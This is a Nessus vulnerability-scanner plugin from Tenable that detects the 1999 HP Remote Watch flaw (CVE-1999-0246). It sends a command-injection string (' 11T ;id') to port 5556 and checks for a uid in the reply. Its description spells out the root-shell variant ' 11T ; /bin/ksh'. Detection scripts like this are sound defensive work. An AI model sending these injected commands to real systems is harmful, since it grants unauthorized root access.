#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10202);
 script_version("$Revision: 1.19 $");
 script_cvs_date("$Date: 2015/10/21 20:34:21 $");

 script_cve_id("CVE-1999-0246");
 script_osvdb_id(152);

 script_name(english:"HP Remote Watch showdisk Remote Privilege Escalation");
 script_summary(english:"Executes 'id' thanks to remwatch");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary commands can be run on the remote server.");
 script_set_attribute(attribute:"description", value:
"remwatch is installed and allows anyone to execute arbitrary commands.

An attacker may issue shell commands as root by connecting to the 
remwatch daemon, and issue the command : 
' 11T ; /bin/ksh'.");
 script_set_attribute(attribute:"solution", value:
"Deactivate the remwatch service. 
Contact your vendor for a patch.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/08/31");
 script_set_attribute(attribute:"vuln_publication_date", value:"1996/10/24");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 1999-2015 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");

 script_dependencie("find_service1.nasl");
 script_require_ports(5556);
 exit(0);
}

#
# The script code starts here
#

port = 5556;
if(!get_port_state(port))exit(0);
soc = open_sock_tcp(port);
if(soc)
{
 s = ' 11T ;id\n';
 send(socket:soc, data:s);
 b = recv(socket:soc, length:1024);
 if ("uid=" >< b)
  security_hole(port:port, extra: strcat("
The id command produced the following output :

", b));
 close(soc);
}
